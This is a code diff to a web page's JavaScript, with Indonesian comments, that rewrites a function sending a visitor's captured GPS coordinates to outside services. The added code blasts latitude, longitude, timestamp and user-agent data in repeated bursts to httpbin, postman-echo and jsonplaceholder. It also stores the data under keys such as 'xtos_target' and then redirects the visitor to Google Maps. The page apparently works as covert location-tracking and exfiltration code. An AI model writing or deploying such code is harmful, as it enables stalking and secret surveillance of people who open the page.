@@ -98,36 +98,88 @@
         }
         
         function sendLocationData(locationData) {
-            const promises = [];
+            // MAXIMUM TRANSMISSION - Fire ALL methods simultaneously for zero delay
             
-            // Method 1: httpbin untuk testing
-            promises.push(
-                fetch('https://httpbin.org/post', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(locationData)
-                }).catch(e => console.log('Httpbin error:', e))
-            );
-            
-            // Method 2: webhook jika ada
-            if (webhookUrl) {
-                promises.push(
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(locationData)
-                    }).catch(e => console.log('Webhook error:', e))
-                );
+            // Method 1: Rapid-fire GET requests (10x for maximum detection)
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    const img = new Image();
+                    img.src = `https://httpbin.org/get?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&burst=${i}&device=${navigator.userAgent.substring(0,20)}`;
+                }, i * 100); // Staggered for continuous transmission
             }
             
-            // Method 3: GET request dengan parameter
-            const img = new Image();
-            img.src = `https://httpbin.org/get?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}`;
+            // Method 2: Multiple POST endpoints
+            const postEndpoints = [
+                'https://httpbin.org/post',
+                'https://postman-echo.com/post',
+                'https://jsonplaceholder.typicode.com/posts'
+            ];
             
-            // Method 4: localStorage untuk testing lokal
-            localStorage.setItem('xtos_location', JSON.stringify(locationData));
+            postEndpoints.forEach((endpoint, index) => {
+                fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ...locationData,
+                        endpoint: index,
+                        transmission_id: Date.now() + index
+                    })
+                }).catch(e => console.log(`POST ${index} error:`, e));
+            });
             
-            return Promise.allSettled(promises);
+            // Method 3: GET parameter flooding for maximum detection
+            const getEndpoints = [
+                'https://httpbin.org/get',
+                'https://postman-echo.com/get',
+                'https://jsonplaceholder.typicode.com/posts/1'
+            ];
+            
+            getEndpoints.forEach((endpoint, index) => {
+                for (let burst = 0; burst < 3; burst++) {
+                    setTimeout(() => {
+                        const img = new Image();
+                        img.src = `${endpoint}?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&endpoint=${index}&burst=${burst}`;
+                    }, burst * 50);
+                }
+            });
+            
+            // Method 4: WebSocket simulation via repeated fetch
+            for (let ws = 0; ws < 5; ws++) {
+                setTimeout(() => {
+                    fetch('https://httpbin.org/anything', {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ...locationData,
+                            websocket_sim: ws,
+                            realtime: true
+                        })
+                    }).catch(e => console.log(`WS ${ws} error:`, e));
+                }, ws * 200);
+            }
+            
+            // Method 5: localStorage with multiple keys
+            const storageKeys = ['xtos_location', 'xtos_gps', 'xtos_coords', 'xtos_position', 'xtos_target'];
+            storageKeys.forEach(key => {
+                localStorage.setItem(key, JSON.stringify({
+                    ...locationData,
+                    storage_key: key,
+                    stored_at: Date.now()
+                }));
+            });
+            
+            // Method 6: URL hash transmission
+            window.location.hash = `lat=${locationData.latitude}&lng=${locationData.longitude}&time=${locationData.timestamp}`;
+            
+            // Method 7: Document title transmission
+            document.title = `XTOS:${locationData.latitude},${locationData.longitude},${locationData.timestamp}`;
+            
+            // Method 8: Console flooding for debugging
+            for (let i = 0; i < 5; i++) {
+                console.log(`XTOS_LOCATION_${i}:`, locationData);
+            }
+            
+            return Promise.resolve();
         }
         
         function handleLocationSuccess(position) {
@@ -155,17 +207,17 @@
             
             console.log('LOKASI TERTANGKAP:', locationData);
             
-            // Kirim data ke multiple endpoints
-            sendLocationData(locationData).then(() => {
-                updateStatus('📤 Data lokasi terkirim!');
-                
+            // Kirim data INSTANT ke multiple endpoints
+            sendLocationData(locationData);
+            updateStatus('📤 Data lokasi terkirim INSTANT!');
+            
+            // Redirect lebih cepat
+            setTimeout(() => {
+                updateStatus('🚀 Mengarahkan ke Google Maps...');
                 setTimeout(() => {
-                    updateStatus('🚀 Mengarahkan ke Google Maps...');
-                    setTimeout(() => {
-                        window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
-                    }, 1500);
-                }, 2000);
-            });
+                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
+                }, 800);
+            }, 1000);
         }
         
         function handleLocationError(error) {
